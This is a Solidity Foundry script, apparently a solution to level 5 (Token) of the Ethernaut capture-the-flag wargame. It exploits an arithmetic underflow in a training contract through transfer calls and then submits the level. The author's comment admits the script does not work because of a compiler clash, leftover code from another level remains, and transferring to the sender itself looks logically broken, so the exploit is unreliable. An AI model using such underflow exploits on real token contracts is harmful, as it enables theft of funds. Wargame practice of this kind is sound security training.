// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Token} from "src/05/Token.sol";
import {TokenFactory} from "src/05/TokenFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

// @note Does not work due to version clashing. Expects 0.6 compiler

contract TokenExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL5_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new TokenFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        // Fallout(instance).Fal1out{value: 1 wei}();
        console.log(Token(instance).balanceOf(msg.sender));
        console.log(Token(instance).balanceOf(levelFactory));
        // console.log(IToken(instance).totalSupply());
        bool success = Token(instance).transfer(msg.sender, 21);
        require(success);
        console.log(success);
        console.log(Token(instance).balanceOf(msg.sender));

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
